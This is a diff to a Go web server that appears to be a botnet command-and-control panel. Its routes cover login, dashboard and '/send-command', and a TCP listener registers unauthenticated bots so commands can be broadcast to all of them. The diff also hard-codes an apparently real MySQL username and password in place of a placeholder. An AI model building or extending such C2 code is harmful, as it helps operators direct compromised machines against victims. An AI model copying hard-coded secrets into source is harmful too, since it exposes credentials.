@@ -45,7 +45,7 @@ func main() {
 	http.HandleFunc("/login", loginHandler)
 	http.HandleFunc("/register", registerHandler)
 	http.HandleFunc("/profile", profileHandler)
-	http.HandleFunc("/dashboard", dashboardHandler) // New route for dashboard
+	http.HandleFunc("/dashboard", dashboardHandler)
 	http.HandleFunc("/logout", logoutHandler)
 	http.HandleFunc("/send-command", sendCommandHandler)
 	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
@@ -73,6 +73,8 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 			http.Redirect(w, r, "/profile", http.StatusSeeOther)
 			return
 		}
+
+		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
 	}
 
 	renderTemplate(w, "login.html", nil)
@@ -264,8 +266,8 @@ func clearSessionCookie(w http.ResponseWriter) {
 
 // initDB initializes the database connection.
 func initDB() {
-	var err error
-	db, err = sql.Open("mysql", "Birdo:password@tcp(192.168.1.34:3308)/net1")
+	var err error               // make sure to edit this line for it to work, make sure to always double check the password 
+	db, err = sql.Open("mysql", "Birdo:Birdo1221.b!@tcp(192.168.1.34:3308)/net1")
 	if err != nil {
 		log.Fatal("Error connecting to database:", err)
 	}
@@ -293,8 +295,6 @@ func startBotListener() {
 			continue
 		}
 
-		// Perform bot authentication (e.g., based on bot ID)
-		// For simplicity, assume bots authenticate successfully
 		botID := generateBotID()
 		botMutex.Lock()
 		botConnections[botID] = conn
@@ -302,7 +302,6 @@ func startBotListener() {
 
 		log.Printf("Bot %d connected from %s\n", botID, conn.RemoteAddr())
 
-		// Handle commands sent from this bot (in a separate goroutine)
 		go handleBotCommands(botID, conn)
 	}
 }
@@ -315,7 +314,7 @@ func generateBotID() int {
 	return botIDCounter
 }
 
-// bot connection.
+// handleBotCommands processes commands received from bots.
 func handleBotCommands(botID int, conn net.Conn) {
 	defer conn.Close()
 
@@ -324,11 +323,7 @@ func handleBotCommands(botID int, conn net.Conn) {
 		command := strings.TrimSpace(scanner.Text())
 		log.Printf("Received command from Bot %d: %s\n", botID, command)
 
-		// Optionally parse and validate commands received from bots
-		// Process commands as needed
-		// Example: Perform actions based on received commands
-
-		// For simplicity, echo back to the bot for demonstration
+		// Echo back to the bot for demonstration
 		response := "Received command: " + command
 		conn.Write([]byte(response + "\n"))
 	}
@@ -352,7 +347,6 @@ func sendToBots(command string) {
 		_, err := conn.Write([]byte(command + "\n"))
 		if err != nil {
 			log.Printf("Error sending command to Bot %d: %v\n", botID, err)
-			// Optionally handle failed command delivery (e.g., reconnect, logging)
 		} else {
 			log.Printf("Sent command to Bot %d: %s\n", botID, command)
 		}
